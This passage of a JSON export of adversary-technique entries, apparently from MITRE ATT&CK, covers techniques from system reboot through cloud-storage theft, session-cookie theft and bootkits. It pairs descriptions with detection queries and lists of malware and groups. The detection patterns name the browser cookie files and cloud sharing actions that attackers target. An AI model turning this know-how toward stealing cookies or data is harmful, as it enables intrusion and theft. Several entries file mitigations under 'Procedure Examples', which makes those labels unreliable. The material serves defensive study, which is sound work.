      "AcidPourincludes functionality to reboot the victim system following wiping actions, similar toAcidRain.[5]",
      "AcidRainreboots the target system once the various wiping processes are complete.[6]",
      "Apostlereboots the victim machine following wiping and related activity.[7]",
      "APT37has used malware that will issue the commandshutdown /r /t 1to reboot a system after wiping its MBR.[8]",
      "APT38has used a custom MBR wiper named BOOTWRECK, which will initiate a system reboot after wiping the victim's MBR.[9]",
      "AvosLocker’s Linux variant has terminated ESXi virtual machines.[10]",
      "BFG Agonizeruses elevated privileges to callNtRaiseHardErrorto induce a \"blue screen of death\" on infected systems, causing a system crash. Once shut down, the system is no longer bootable.[11]",
      "Black Bastahas usedShellExecuteAto shut down and restart the victim system.[12]",
      "CHIMNEYSWEEPcan reboot or shutdown the targeted system or logoff the current user.[13]",
      "DarkGatehas used theshutdowncommand to shut down and/or restart the victim system.[14]",
      "DCSrvhas a function to sleep for two hours before rebooting the system.[15]",
      "HermeticWipercan initiate a system shutdown.[16][17]",
      "KillDiskattempts to reboot the machine by terminating specific processes.[18]",
      "Latrodectushas the ability to restart compromised hosts.[19]",
      "Lazarus Grouphas rebooted systems after destroying files and wiping the MBR on infected systems.[20]",
      "LockerGogahas been observed shutting down infected systems.[21]",
      "LookBackcan shutdown and reboot the victim machine.[22]",
      "Mazehas issued a shutdown command on a victim machine that, upon reboot, will run the ransomware within a VM.[23]",
      "MultiLayer Wiperreboots the infected system following wiping and related tasks to prevent system recovery.[11]",
      "NotPetyawill reboot the system one hour after infection.[3][24]",
      "Olympic Destroyerwill shut down the compromised system after it is done modifying system configuration settings.[4][24]",
      "Shamoonwill reboot the infected system once the wiping functionality has been completed.[25][26]",
      "ShrinkLockercan restart the victim system if it encounters an error during execution, and will forcibly shutdown the system following encryption to lock out victim users.[27]",
      "WhisperGatecan shutdown a compromised host through execution ofExitWindowsExwith theEXW_SHUTDOWNflag.[28]",
      "XLoadercan initiate a system reboot or shutdown.[29]"
    ]
  },
  "T1530": {
    "Name": "Data from Cloud Storage",
    "Description": "Adversaries may access data from cloud storage.Many IaaS providers offer solutions for online data object storage such as Amazon S3, Azure Storage, and Google Cloud Storage. Similarly, SaaS enterprise platforms such as Office 365 and Google Workspace provide cloud-based document storage to users through services such as OneDrive and Google Drive, while SaaS application providers such as Slack, Confluence, Salesforce, and Dropbox may provide cloud storage solutions as a peripheral or primary use case of their platform.In some cases, as with IaaS-based cloud storage, there exists no overarching application (such as SQL or Elasticsearch) with which to interact with the stored objects: instead, data from these solutions is retrieved directly though theCloud API. In SaaS applications, adversaries may be able to collect this data directly from APIs or backend cloud storage objects, rather than through their front-end application or interface (i.e.,Data from Information Repositories).Adversaries may collect sensitive data from these cloud storage solutions. Providers typically offer security guides to help end users configure systems, though misconfigurations are a common problem.[1][2][3]There have been numerous incidents where cloud storage has been improperly secured, typically by unintentionally allowing public access to unauthenticated users, overly-broad access by all users, or even access for any anonymous person outside the control of the Identity Access Management system without even needing basic user permissions.This open access may expose various types of sensitive data, such as credit cards, personally identifiable information, or medical records.[4][5][6][7]Adversaries may also obtain then abuse leaked credentials from source repositories, logs, or other means as a way to gain access to cloud storage objects.",
    "Detects": [
      "Monitor M365 Audit logs for TeamsSessionStarted Operations against MicrosoftTeams workloads involving suspicious ClientIPs and suspect accounts (UserId).Analytic 1 - Sessions initiated from unusual IP addresses, high volume of sessions from a single account, sessions at unusual times\"`index=\"\"m365_audit_logs\"\" Operation=\"\"TeamsSessionStarted\"\"| stats count by UserId, ClientIP, CreationTime| where ClientIP!=\"\"expected_ip\"\" OR UserId!=\"\"expected_user\"\"| sort by CreationTime\"",
      "Monitor for unusual queries to the cloud provider's storage service. Activity originating from unexpected sources may indicate improper permissions are set and are allowing access to data. Additionally, detecting failed attempts by a user for a certain object, followed by escalation of privileges by the same user, and access to the same object may be an indication of suspicious activity."
    ],
    "Procedure Examples": [
      "AADInternals can collect files from a user’s OneDrive.[8]",
      "APT42has collected data from Microsoft 365 environments.[9][10]",
      "DuringC0027,Scattered Spideraccessed victim OneDrive environments to search for VPN and MFA enrollment information, help desk instructions, and new hire guides.[11]",
      "Fox Kittenhas obtained files from the victim's cloud storage instances.[12]",
      "HAFNIUMhas exfitrated data from OneDrive.[13]",
      "Pacucan enumerate and download files stored in AWS storage services, such as S3 buckets.[14]",
      "Peiratescan dump the contents of AWS S3 buckets. It can also retrieve service account tokens from kOps buckets in Google Cloud Storage or S3.[15]",
      "Scattered Spiderenumerates data stored in cloud resources for collection and exfiltration purposes.[16]"
    ]
  },
  "T1531": {
    "Name": "Account Access Removal",
    "Description": "Adversaries may interrupt availability of system and network resources by inhibiting access to accounts utilized by legitimate users. Accounts may be deleted, locked, or manipulated (ex: changed credentials) to remove access to accounts. Adversaries may also subsequently log off and/or perform aSystem Shutdown/Rebootto set malicious changes into place.[1][2]In Windows,Netutility,Set-LocalUserandSet-ADAccountPasswordPowerShellcmdlets may be used by adversaries to modify user accounts. Accounts could also be disabled by Group Policy. In Linux, thepasswdutility may be used to change passwords. On ESXi servers, accounts can be removed or modified via esxcli (system account set,system account remove).Adversaries who use ransomware or similar attacks may first perform this and other Impact behaviors, such asData DestructionandDefacement, in order to impede incident response/recovery before completing theData Encrypted for Impactobjective.",
    "Detects": [
      "Monitor for changes made to AD settings for unexpected modifications to user accounts, such as deletions or potentially malicious changes to user attributes (credentials, status, etc.).Analytic 1 - Unusual password change operationsindex=\"m365_audit_logs\" Operation=\"Change user password\"| stats count by Actor, TargetUser| where Actor!=\"expected_actor\" AND TargetUser!=\"expected_target_user\"",
      "Monitor for unexpected deletions of user accounts. Windows event logs may designate activity associated with an adversary's attempt to remove an account (ex: Event ID 4726 - A user account was deleted).Alerting on these Event IDs may generate a high degree of false positives, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible.",
      "Monitor for changes made to user accounts for unexpected modification of properties, such as passwords or status (enabled/disabled). Windows event logs may designate activity associated with an adversary's attempt to remove access to an account:Event ID 4723 - An attempt was made to change an account's passwordEvent ID 4724 - An attempt was made to reset an account's passwordEvent ID 4725 - A user account was disabledAlerting on these Event IDs may generate a high degree of false positives, so compare against baseline knowledge for how systems are typically used and correlate modification events with other indications of malicious activity where possible."
    ],
    "Procedure Examples": [
      "Akiradeletes administrator accounts in victim networks prior to encryption.[3]",
      "DEADWOODchanges the password for local and domain users vianet.exeto a random 32 character string to prevent these accounts from logging on. Additionally,DEADWOODwill terminate thewinlogon.exeprocess to prevent attempts to log on to the infected system.[4]",
      "LAPSUS$has removed a targeted organization's global admin accounts to lock the organization out of all access.[5]",
      "LockerGogahas been observed changing account passwords and logging off current users.[1][2]",
      "MegaCortexhas changed user account passwords and logged users off the system.[6]",
      "Meteorhas the ability to change the password of local users on compromised hosts and can log off users.[7]"
    ]
  },
  "T1534": {
    "Name": "Internal Spearphishing",
    "Description": "After they already have access to accounts or systems within the environment, adversaries may use internal spearphishing to gain access to additional information or compromise other users within the same organization. Internal spearphishing is multi-staged campaign where a legitimate account is initially compromised either by controlling the user's device or by compromising the account credentials of the user. Adversaries may then attempt to take advantage of the trusted internal account to increase the likelihood of tricking more victims into falling for phish attempts, often incorporatingImpersonation.[1]For example, adversaries may leverageSpearphishing AttachmentorSpearphishing Linkas part of internal spearphishing to deliver a payload or redirect to an external site to capture credentials throughInput Captureon sites that mimic login interfaces.Adversaries may also leverage internal chat apps, such as Microsoft Teams, to spread malicious content or engage users in attempts to capture sensitive information and/or credentials.[2]",
    "Detects": [
      "Monitor email gateways usually do not scan internal email, but an organization can leverage the journaling-based solution which sends a copy of emails to a security service for offline analysis or incorporate service-integrated solutions using on-premise or API-based integrations to help detect internal spearphishing attacks.[8]sourcetype=\"office365:audit\" OR sourcetype=\"googleworkspace:email\" OR sourcetype=\"chat:log\"| search action IN (\"SendEmail\", \"AddAttachment\", \"CreateMailItem\") OR event IN (\"message_sent\", \"attachment_added\")| eval sender_domain=split(sender, \"@\")[1]| where sender_domain=\"internaldomain.com\" AND (like(subject, \"%urgent%\") OR like(body, \"%reset your password%\") OR match(attachment, \".(exe|vbs|js|docm|xlsm|zip)\"))| stats count by sender, recipient, subject, attachment, _time| eval spearphishing_detected=if(count > threshold OR match(subject, \"reset|verify|urgent|important\"), \"suspicious\", \"normal\")| where spearphishing_detected=\"suspicious\"| table _time, sender, recipient, subject, attachment, spearphishing_detected",
      "Monitor for communication traffic containing suspicious payloads or URLs, especially those associated with internal email or chat systems. Analyze for outbound or inbound traffic related to known or newly registered domains that could be used for credential phishing or payload delivery.sourcetype=\"network:packet_capture\" OR sourcetype=\"ids:alert\"| search (http_request_uri=\"*.php?login\" OR dns IN (\"suspiciousdomain.com\", \"newly-registered-domain.com\")) OR (http_method=\"POST\" AND url_length > threshold)| stats count by src_ip, dest_ip, dest_port, protocol, http_request_uri, _time| eval anomaly_detected=if(count > threshold OR match(http_request_uri, \"login|credentials|reset\"), \"suspicious\", \"normal\")| where anomaly_detected=\"suspicious\"| table _time, src_ip, dest_ip, http_request_uri, protocol, anomaly_detected",
      "Monitor network data for uncommon data flows. Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious."
    ],
    "Procedure Examples": [
      "Gamaredon Grouphas used an Outlook VBA module on infected systems to send phishing emails with malicious attachments to other employees within the organization.[3]",
      "HEXANEhas conducted internal spearphishing attacks against executives, HR, and IT personnel to gain information and access.[4]",
      "Kimsukyhas sent internal spearphishing emails for lateral movement after stealing victim information.[5]",
      "Leviathanhas conducted internal spearphishing within the victim's environment for lateral movement.[6]",
      "DuringOperation Dream Job,Lazarus Groupconducted internal spearphishing from within a compromised organization.[7]"
    ]
  },
  "T1535": {
    "Name": "Unused/Unsupported Cloud Regions",
    "Description": "Adversaries may create cloud instances in unused geographic service regions in order to evade detection. Access is usually obtained through compromising accounts used to manage cloud infrastructure.Cloud service providers often provide infrastructure throughout the world in order to improve performance, provide redundancy, and allow customers to meet compliance requirements. Oftentimes, a customer will only use a subset of the available regions and may not actively monitor other regions. If an adversary creates resources in an unused region, they may be able to operate undetected.A variation on this behavior takes advantage of differences in functionality across cloud regions. An adversary could utilize regions which do not support advanced detection services in order to avoid detection of their activity.An example of adversary use of unused AWS regions is to mine cryptocurrency throughResource Hijacking, which can cost organizations substantial amounts of money over time depending on the processing power used.[1]",
    "Detects": [
      "Monitor system logs to review instance activities occurring across all cloud environments and regions.",
      "Monitor and consider configuring alerting to notify of activity in normally unused regions or if the number of instances active in a region goes above a certain threshold."
    ],
    "Procedure Examples": [
      "Cloud service providers may allow customers to deactivate unused regions.[1]"
    ]
  },
  "T1537": {
    "Name": "Transfer Data to Cloud Account",
    "Description": "Adversaries may exfiltrate data by transferring the data, including through sharing/syncing and creating backups of cloud environments, to another cloud account they control on the same service.A defender who is monitoring for large transfers to outside the cloud environment through normal file transfers or over command and control channels may not be watching for data transfers to another account within the same cloud provider. Such transfers may utilize existing cloud provider APIs and the internal address space of the cloud provider to blend into normal traffic or avoid data transfers over external network interfaces.[1]Adversaries may also use cloud-native mechanisms to share victim data with adversary-controlled cloud accounts, such as creating anonymous file sharing links or, in Azure, a shared access signature (SAS) URI.[2]Incidents have been observed where adversaries have created backups of cloud instances and transferred them to separate accounts.[3]",
    "Detects": [
      "Monitor logs for SaaS applications to detect instances of data being shared inappropriately. For example, in Microsoft 365, file sharing events will appear in Audit logs under the event namesSharingInvitationCreated,AnonymousLinkCreated,SecureLinkCreated, orAddedToSecureLink, withTargetUserOrGroupTypebeingGuest.[11]In Google Workspace, externally shared files will have aVisibilityproperty ofShared externallyin the Drive audit logs.[12]Analytic 1 - Detecting Cloud Data Sharing with External Accounts(EventCode=\"ModifySnapshotAttribute\" OR EventCode=\"PutBucketAcl\" OR EventCode=\"CreateSharedAccessSignature\")| where (action IN (\"share\", \"modify_acl\", \"create_sas_url\"))| stats count by _time, host, user, action, destination_account, object_type| where count >= 3| eval risk_score=case(    action IN (\"share\", \"create_sas_url\") AND destination_account NOT IN (trusted_accounts), 9,    action IN (\"modify_acl\"), 8)| where risk_score >= 8| table _time, host, user, action, destination_account, object_type, risk_score",
      "Monitor account activity for attempts to create and share data, such as snapshots or backups, with untrusted or unusual accounts.Analytic 1 - Detecting Creation of Storage for Exfiltration(EventCode=\"CreateBucket\" OR EventCode=\"StorageAccountCreated\" OR source=\"Google_Admin_Logs\")| where (action IN (\"create_bucket\", \"create_storage_account\", \"create_shared_drive\"))| stats count by _time, host, user, action, storage_name| where count >= 3| eval risk_score=case(    storage_name LIKE \"%backup%\" OR storage_name LIKE \"%export%\", 9,    storage_name LIKE \"%temp%\" OR storage_name LIKE \"%new%\", 8)| where risk_score >= 8| table _time, host, user, action, storage_name, risk_score",
      "Periodically baseline cloud storage infrastructure to identify malicious modifications or additions.",
      "Monitor for anomalous file transfer activity between accounts and/or to untrusted/unexpected VPCs.Analytic 1 - Detecting Cloud Storage Permission Changes for Exfiltration(EventCode=\"PutBucketPolicy\" OR EventCode=\"ModifyStoragePermissions\" OR source=\"Google_Admin_Logs\")| where (action IN (\"modify_acl\", \"change_permissions\", \"public_read_enabled\"))| stats count by _time, host, user, action, storage_name| where count >= 3| eval risk_score=case(    action=\"public_read_enabled\", 9,    action=\"modify_acl\", 8)| where risk_score >= 8| table _time, host, user, action, storage_name, risk_score",
      "Monitor network traffic content for evidence of data exfiltration, such as gratuitous or anomalous internal traffic containing collected data. Consider correlation with process monitoring and command lines associated with collection and exfiltration.",
      "Monitor account activity for attempts to create and share data, such as snapshots or backups, with untrusted or unusual accounts.Analytic 1 - Detecting Suspicious Snapshot Exfiltration(EventCode=\"CreateSnapshot\" OR EventCode=\"ModifySnapshotAttribute\" OR source=\"Google_Admin_Logs\")| where (action IN (\"create_snapshot\", \"modify_snapshot_acl\", \"backup_created\"))| stats count by _time, host, user, action, snapshot_name| where count >= 3| eval risk_score=case(    snapshot_name LIKE \"%backup%\" OR snapshot_name LIKE \"%export%\", 9,    snapshot_name LIKE \"%snapshot%\", 8)| where risk_score >= 8| table _time, host, user, action, snapshot_name, risk_score",
      "Periodically baseline snapshots to identify malicious modifications or additions.",
      "Monitor account activity for attempts to share data, snapshots, or backups with untrusted or unusual accounts on the same cloud service provider. Monitor for anomalous file transfer activity between accounts and to untrusted VPCs."
    ],
    "Procedure Examples": [
      "INC Ransomhas used Megasync to exfiltrate data to the cloud.[4]",
      "RedCurlhas used cloud storage to exfiltrate data, in particular the megatools utilities were used to exfiltrate data to Mega, a file storage service.[5][6]"
    ]
  },
  "T1538": {
    "Name": "Cloud Service Dashboard",
    "Description": "An adversary may use a cloud service dashboard GUI with stolen credentials to gain useful information from an operational cloud environment, such as specific services, resources, and features. For example, the GCP Command Center can be used to view all assets, review findings of potential security risks, and run additional queries, such as finding public IP addresses and open ports.[1]Depending on the configuration of the environment, an adversary may be able to enumerate more information via the graphical dashboard than an API. This also allows the adversary to gain information without manually making any API requests.",
    "Detects": [
      "Monitor for newly constructed logon behavior across cloud service management consoles.[3]In AWS environments, look for theConsoleLoginsign-in event.",
      "Correlate other security systems with login information, such as user accounts, IP addresses, and login names.[3]"
    ],
    "Procedure Examples": [
      "Scattered Spiderabused AWS Systems Manager Inventory to identify targets on the compromised network prior to lateral movement.[2]"
    ]
  },
  "T1539": {
    "Name": "Steal Web Session Cookie",
    "Description": "An adversary may steal web application or service session cookies and use them to gain access to web applications or Internet services as an authenticated user without needing credentials. Web applications and services often use session cookies as an authentication token after a user has authenticated to a website.Cookies are often valid for an extended period of time, even if the web application is not actively used. Cookies can be found on disk, in the process memory of the browser, and in network traffic to remote systems. Additionally, other applications on the targets machine might store sensitive authentication cookies in memory (e.g. apps which authenticate to cloud services). Session cookies can be used to bypasses some multi-factor authentication protocols.[1]There are several examples of malware targeting cookies from web browsers on the local system.[2][3]Adversaries may also steal cookies by injecting malicious JavaScript content into websites or relying onUser Executionby tricking victims into running malicious JavaScript in their browser.[4][5]There are also open source frameworks such asEvilginx2andMuraenathat can gather session cookies through a malicious proxy (e.g.,Adversary-in-the-Middle) that can be set up by an adversary and used in phishing campaigns.[6][7]After an adversary acquires a valid cookie, they can then perform aWeb Session Cookietechnique to login to the corresponding web application.",
    "Detects": [
      "Monitor for an attempt by a user to gain access to a network or computing resource, often by providing credentials to cloud service management consoles. Some cloud providers, such as AWS, provide distinct log events for login attempts to the management console.Analytic 1 - Unexpected access to web session cookies files.(index=security sourcetype=\"WinEventLog:Security\" EventCode=4663 ObjectName=\"\\AppData\\Roaming\\\\Cookies\\\" OR ObjectName=\"\\AppData\\Local\\\\Cookies\\\") OR(index=sysmon sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=11 TargetObject=\"\\AppData\\Roaming\\\\Cookies\\\" OR TargetObject=\"\\AppData\\Local\\\\Cookies\\\") OR(index=os sourcetype=\"linux_audit\" (filepath=\"/home//.mozilla/firefox/.default-release/cookies.sqlite\" OR filepath=\"/home//.config/google-chrome/Default/Cookies\")) OR(index=os sourcetype=\"macos_secure\" file_path=\"/Users//Library/Application Support/Google/Chrome/Default/Cookies\") OR(index=gsuite sourcetype=\"gsuite:admin\" event_name=\"LOGIN\" event_type=\"cookie_auth\") OR(index=o365 sourcetype=\"o365:management:activity\" Operation=\"UserLoginViaCookie\")",
      "Monitor for attempts by programs to inject into or dump browser process memory.Analytic 1 - Unauthorized access or injection into browser processes.(index=security sourcetype=\"WinEventLog:Security\" EventCode=4688 OR EventCode=4663) OR(index=sysmon sourcetype=\"WinEventLog:Microsoft-Windows-Sysmon/Operational\" EventCode=1 OR EventCode=10) OR(index=os sourcetype=\"linux_secure\" action=\"execve\" OR action=\"ptrace\") OR(index=os sourcetype=\"macos_secure\" event_type=\"execve\" OR event_type=\"ptrace\") OR(index=gsuite sourcetype=\"gsuite:admin\" event_name=\"LOGIN\" event_type=\"cookie_auth\") OR(index=o365 sourcetype=\"o365:management:activity\" Operation=\"UserLoginViaCookie\")"
    ],
    "Procedure Examples": [
      "APT42has used custom malware to steal login and cookie data from common browsers.[8]",
      "BLUELIGHTcan harvest cookies from Internet Explorer, Edge, Chrome, and Naver Whale browsers.[9]",
      "Chaeshas used a script that extracts the web session cookie and sends it to the C2 server.[10]",
      "CookieMinercan steal Google Chrome and Apple Safari browser cookies from the victim’s machine.[11]",
      "DarkGateattempts to steal Opera cookies, if present, after terminating the related process.[12]",
      "EVILNUMcan harvest cookies and upload them to the C2 server.[13]",
      "Evilnumcan steal cookies and session information from browsers.[14]",
      "Grandoreirocan steal the victim's cookies to use for duplicating the active session from another device.[15]",
      "Kimsukyhas used malware, such asTRANSLATEXT, to steal and exfiltrate browser cookies.[16][17]",
      "Lotus Blossomhas used publicly-available tools to steal cookies from browsers such as Chrome.[18]",
      "LuminousMothhas used an unnamed post-exploitation tool to steal cookies from the Chrome browser.[19]",
      "Lumma Stealerhas harvested cookies from various browsers.[20][21][22]",
      "MgBotincludes modules that can steal cookies from Firefox, Chrome, and Edge web browsers.[23]",
      "QakBothas the ability to capture web session cookies.[24][25]",
      "Raccoon Stealerattempts to steal cookies and related information in browser history.[26]",
      "Sandworm Teamused information stealer malware to collect browser session cookies.[27]",
      "Scattered Spiderretrieves browser cookies via Raccoon Stealer.[28]",
      "During theSolarWinds Compromise,APT29stole Chrome browser cookies by copying the Chrome profile directories of targeted users.[29]",
      "Spicahas the ability to steal cookies from Chrome, Firefox, Opera, and Edge browsers.[30]",
      "Star Blizzardhas used EvilGinx to steal the session cookies of victims directed to phishing domains.[31]",
      "TajMahalhas the ability to steal web session cookies from Internet Explorer, Netscape Navigator, FireFox and RealNetworks applications.[2]",
      "TRANSLATEXThas exfiltrated updated cookies from Google, Naver, Kakao or Daum to the C2 server.[16]",
      "XCSSETusesscpto access the~/Library/Cookies/Cookies.binarycookiesfile.[32]",
      "XLoadercan capture web session cookies and session information from victim browsers.[33]"
    ]
  },
  "T1542": {
    "Name": "Pre-OS Boot",
    "Description": "Adversaries may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. During the booting process of a computer, firmware and various startup services are loaded before the operating system. These programs control flow of execution before the operating system takes control.[1]Adversaries may overwrite data in boot drivers or firmware such as BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) to persist on systems at a layer below the operating system. This can be particularly difficult to detect as malware at this level will not be detected by host software-based defenses.",
    "Detects": [
      "Monitor executed commands and arguments in command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration.",
      "Monitor for changes to MBR and VBR as they occur for indicators for suspicious activity and further analysis. Take snapshots of MBR and VBR and compare against known good samples.",
      "Disk check, forensic utilities, and data from device drivers (i.e. processes and API calls) may reveal anomalies that warrant deeper investigation",
      "On UEFI boot systems, monitor for newly created files in the ESP.",
      "On UEFI boot systems, monitor for newly modified files in the ESP,  especially ones whose modification times do not match other files or files inC:\\Windows\\Boot\\EFI.[4]",
      "Monitor for changes made on pre-OS boot mechanisms that can be manipulated for malicious purposes. Take snapshots of boot records and firmware and compare against known good images. Log changes to boot records, BIOS, and EFI",
      "Monitor for newly constructed network device configuration and system image against a known-good version to discover unauthorized changes to system boot, startup configuration, or the running OS. The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor.",
      "Monitor for API calls that may abuse Pre-OS Boot mechanisms as a way to establish persistence on a system. Disk check, forensic utilities, and data from device drivers (i.e. API calls) may reveal anomalies that warrant deeper investigation.[5]"
    ],
    "Procedure Examples": [
      "Perform audits or scans of systems, permissions, insecure software, insecure configurations, etc. to identify potential weaknesses.",
      "Use Trusted Platform Module technology and a secure or trusted boot process to prevent system integrity from being compromised. Check the integrity of the existing BIOS or EFI to determine if it is vulnerable to modification.[2][3]",
      "Prevent access to file shares, remote access to systems, unnecessary services. Mechanisms to limit access may include use of network concentrators, RDP gateways, etc.",
      "Ensure proper permissions are in place to help prevent adversary access to privileged accounts necessary to perform these actions",
      "Patch the BIOS and EFI as necessary."
    ]
  },
  "T1542.001": {
    "Name": "Pre-OS Boot:System Firmware",
    "Description": "Adversaries may modify system firmware to persist on systems.The BIOS (Basic Input/Output System) and The Unified Extensible Firmware Interface (UEFI) or Extensible Firmware Interface (EFI) are examples of system firmware that operate as the software interface between the operating system and hardware of a computer.[1][2][3]System firmware like BIOS and (U)EFI underly the functionality of a computer and may be modified by an adversary to perform or assist in malicious activity. Capabilities exist to overwrite the system firmware, which may give sophisticated adversaries a means to install malicious firmware updates as a means of persistence on a system that may be difficult to detect.",
    "Detects": [
      "Monitor for changes made to firmware.[9]Dump and inspect BIOS images on vulnerable systems and compare against known good images.[10]Analyze differences to determine if malicious changes have occurred. Log attempts to read/write to BIOS and compare against known patching behavior.Likewise, EFI modules can be collected and compared against a known-clean list of EFI executable binaries to detect potentially malicious modules. The CHIPSEC framework can be used for analysis to determine if firmware modifications have been performed.[11][12][13]"
    ],
    "Procedure Examples": [
      "Hacking Team UEFI Rootkitis a UEFI BIOS rootkit developed by the company Hacking Team to persist remote access software on some targeted systems.[4]",
      "LoJaxis a UEFI BIOS rootkit deployed to persist remote access software on some targeted systems.[5]",
      "Trojan.Mebromiperforms BIOS modification and can download and execute a file as well as protect itself from removal.[6]"
    ]
  },
  "T1542.002": {
    "Name": "Pre-OS Boot:Component Firmware",
    "Description": "Adversaries may modify component firmware to persist on systems. Some adversaries may employ sophisticated means to compromise computer components and install malicious firmware that will execute adversary code outside of the operating system and main system firmware or BIOS. This technique may be similar toSystem Firmwarebut conducted upon other system components/devices that may not have the same capability or level of integrity checking.Malicious component firmware could provide both a persistent level of access to systems despite potential typical failures to maintain access and hard disk re-images, as well as a way to evade host software-based defenses and integrity checks.",
    "Detects": [
      "Monitor for unexpected disk partition table entries, or blocks of otherwise unusual memory that warrant deeper investigation",
      "Monitor for changes that may reveal indicators of malicious firmware such as strings. Also consider comparing components, including hashes of component firmware and behavior, against known good images.",
      "Monitor for API calls associated with the use of device drivers and/or provided by SMART (Self-Monitoring, Analysis and Reporting Technology)[3][4]disk monitoring may reveal malicious manipulations of components. Otherwise, this technique may be difficult to detect since malicious activity is taking place on system components possibly outside the purview of OS security and integrity mechanisms."
    ],
    "Procedure Examples": [
      "Cyclops Blinkhas maintained persistence by patching legitimate device firmware when it is downloaded, including that of WatchGuard devices.[1]",
      "Equationis known to have the capability to overwrite the firmware on hard drives from some manufacturers.[2]"
    ]
  },
  "T1542.003": {
    "Name": "Pre-OS Boot:Bootkit",
    "Description": "Adversaries may use bootkits to persist on systems. A bootkit is a malware variant that modifies the boot sectors of a hard drive, allowing malicious code to execute before a computer's operating system has loaded. Bootkits reside at a layer below the operating system and may make it difficult to perform full remediation unless an organization suspects one was used and can act accordingly.In BIOS systems, a bootkit may modify the Master Boot Record (MBR) and/or Volume Boot Record (VBR).[1]The MBR is the section of disk that is first loaded after completing hardware initialization by the BIOS. It is the location of the boot loader. An adversary who has raw access to the boot drive may overwrite this area, diverting execution during startup from the normal boot loader to adversary code.[2]The MBR passes control of the boot process to the VBR. Similar to the case of MBR, an adversary who has raw access to the boot drive may overwrite the VBR to divert execution during startup to adversary code.In UEFI (Unified Extensible Firmware Interface) systems, a bootkit may instead create or modify files in the EFI system partition (ESP). The ESP is a partition on data storage used by devices containing UEFI that allows the system to boot the OS and other utilities used by the system. An adversary can use the newly created or patched files in the ESP to run malicious kernel code.[3][4]",
    "Detects": [
      "On BIOS boot systems, monitor for changes to MBR and VBR as they occur for indicators for suspicious activity and further analysis. Take snapshots of MBR and VBR and compare against known good samples.",
      "On UEFI boot systems, monitor for newly created files in the ESP.",
      "On UEFI boot systems, monitor for newly modified files in the ESP,  especially ones whose modification times do not match other files or files inC:\\Windows\\Boot\\EFI.[3]"
    ],
    "Procedure Examples": [
      "APT28has deployed a bootkit along withDowndelphto ensure its persistence on the victim. The bootkit shares code with some variants ofBlackEnergy.[5]",
      "APT41deployed Master Boot Record bootkits on Windows systems to hide their malware and maintain persistence on victim systems.[6]",
      "BOOTRASHis a Volume Boot Record (VBR) bootkit that uses the VBR to maintain persistence.[1][7][8]",
      "Carberphas installed a bootkit on the system to maintain persistence.[9]",
      "SomeFinFishervariants incorporate an MBR rootkit.[10][11]",
      "Lazarus Groupmalware WhiskeyAlfa-Three modifies sector 0 of the Master Boot Record (MBR) to ensure that the malware will persist even if a victim machine shuts down.[12][13]",
      "ROCKBOOTis a Master Boot Record (MBR) bootkit that uses the MBR to establish persistence.[7]",
      "TrickBotcan implant malicious code into a compromised device's firmware.[14]",
      "WhisperGateoverwrites the MBR with a bootloader component that performs destructive wiping operations on hard drives and displays a fake ransom note when the host boots.[15][16][17][18][19]"
    ]
  },
  "T1542.004": {
    "Name": "Pre-OS Boot:ROMMONkit",
    "Description": "Adversaries may abuse the ROM Monitor (ROMMON) by loading an unauthorized firmware with adversary code to provide persistent access and manipulate device behavior that is difficult to detect.[1][2]ROMMON is a Cisco network device firmware that functions as a boot loader, boot image, or boot helper to initialize hardware and software when the platform is powered on or reset. Similar toTFTP Boot, an adversary may upgrade the ROMMON image locally or remotely (for example, through TFTP) with adversary code and restart the device in order to overwrite the existing ROMMON image. This provides adversaries with the means to update the ROMMON to gain persistence on a system in a way that may be difficult to detect.",
    "Detects": [
      "There are no documented means for defenders to validate the operation of the ROMMON outside of vendor support. If a network device is suspected of being compromised, contact the vendor to assist in further investigation."
    ],
    "Procedure Examples": [
      "Periodically check the integrity of system image to ensure it has not been modified.[3][4][5]",
      "Enable secure boot features to validate the digital signature of the boot environment and system image using a special purpose hardware device. If the validation check fails, the device will fail to boot preventing loading of unauthorized software.[6]",
      "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific protocols, such as TFTP, can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific technique used by a particular adversary or tool, and will likely be different across various network configurations."
    ]
  },
  "T1542.005": {
    "Name": "Pre-OS Boot:TFTP Boot",
    "Description": "Adversaries may abuse netbooting to load an unauthorized network device operating system from a Trivial File Transfer Protocol (TFTP) server. TFTP boot (netbooting) is commonly used by network administrators to load configuration-controlled network device images from a centralized management server. Netbooting is one option in the boot sequence and can be used to centralize, manage, and control device images.Adversaries may manipulate the configuration on the network device specifying use of a malicious TFTP server, which may be used in conjunction withModify System Imageto load a modified image on device startup or reset. The unauthorized image allows adversaries to modify device configuration, add malicious capabilities to the device, and introduce backdoors to maintain control of the network device while minimizing detection through use of a standard functionality. This technique is similar toROMMONkitand may result in the network device running a modified image.[1]",
    "Detects": [
      "Monitor executed commands and arguments in command history in either the console or as part of the running memory to determine if unauthorized or suspicious commands were used to modify device configuration.",
      "Monitor for changes to boot information including system uptime, image booted, and startup configuration to determine if results are consistent with expected behavior in the environment.[8]Monitor unusual connections or connection attempts to the device that may specifically target TFTP or other file-sharing protocols.",
      "Monitor for newly constructed network device configuration and system image against a known-good version to discover unauthorized changes to system boot, startup configuration, or the running OS.[5][2]The same process can be accomplished through a comparison of the run-time memory, though this is non-trivial and may require assistance from the vendor."
    ],
    "Procedure Examples": [
      "Periodically check the integrity of the running configuration and system image to ensure they have not been modified.[2][3][4]",
      "Enable secure boot features to validate the digital signature of the boot environment and system image using a special purpose hardware device. If the validation check fails, the device will fail to boot preventing loading of unauthorized software.[5]",
      "Restrict use of protocols without encryption or authentication mechanisms. Limit access to administrative and management interfaces from untrusted network sources.",
      "Network intrusion detection and prevention systems that use network signatures to identify traffic for specific protocols, such as TFTP, can be used to mitigate activity at the network level. Signatures are often for unique indicators within protocols and may be based on the specific technique used by a particular adversary or tool, and will likely be different across various network configurations.",
      "Follow vendor device hardening best practices to disable unnecessary and unused features and services, avoid using default configurations and passwords, and introduce logging and auditing for detection.",
